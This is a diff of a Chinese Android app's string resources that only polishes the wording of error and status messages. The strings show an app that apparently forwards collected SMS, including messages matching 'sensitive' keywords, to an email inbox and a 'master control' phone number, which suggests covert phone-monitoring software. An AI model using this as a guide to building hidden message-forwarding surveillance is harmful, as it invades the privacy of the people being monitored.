@@ -73,7 +73,7 @@
     <string name="pref_sender_pwd_title">发信邮箱密码</string>
     <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail邮箱地址。</string>
     <string name="pref_recv_mail_title">收信邮箱</string>
-    <string name="pref_invalid_mail_format">警告：%s 不是一个有效的邮箱地址。</string>
+    <string name="pref_invalid_mail_format">%s不是有效的邮箱地址。</string>
     <string name="pref_pls_input_pwd">请输入邮箱密码。</string> 
     <string name="pref_info_interval_title">间隔</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">收集间隔</string>
@@ -85,7 +85,7 @@
     <string name="pref_target_num_count_reach_max">最多支持9个号码段，用空格隔开。</string>
     <string name="pref_target_num_format_error">每个号码段至少为4位数字。</string>
     <string name="pref_recv_phonenum_title">主控手机号码</string>
-    <string name="pref_pls_input_valid_recv_phonenum">错误：%s不是有效的手机号码。</string>
+    <string name="pref_pls_input_valid_recv_phonenum">%s不是有效的手机号码。</string>
     <string name="pref_sensitive_words_enable_title">敏感短信实时转发</string>
     <string name="pref_sensitive_words_title">敏感词（空格隔开）</string>
     <string name="pref_sensitive_words_summary">请用空格隔开每个敏感词，最多支持9个。</string>
@@ -122,10 +122,10 @@
     <string name="init_sending">正在发邮件...</string>
     
     <!-- Actions -->
-    <string name="action_send_mail_success">发信成功。稍后请查阅您的邮箱</string>
-    <string name="action_send_mail_fail">发信失败，请检查您设置的邮件地址是否有效</string>
+    <string name="action_send_mail_success">发信成功。稍后请查阅您的邮箱。</string>
+    <string name="action_send_mail_fail">发信失败，请检查接收邮件地址是否有效。</string>
     <string name="action_network_disconnected">网络未连接</string>
-    <string name="action_goto_network_setting">当前网络未连接。您想现在打开网络连接吗？</string>
+    <string name="action_goto_network_setting">网络未连接。您想现在打开网络连接吗？</string>
     
     <!-- Message -->
 	<string name="msg_invalid_key">无效的注册码。可能已被使用。请联系您的软件提供商。</string>
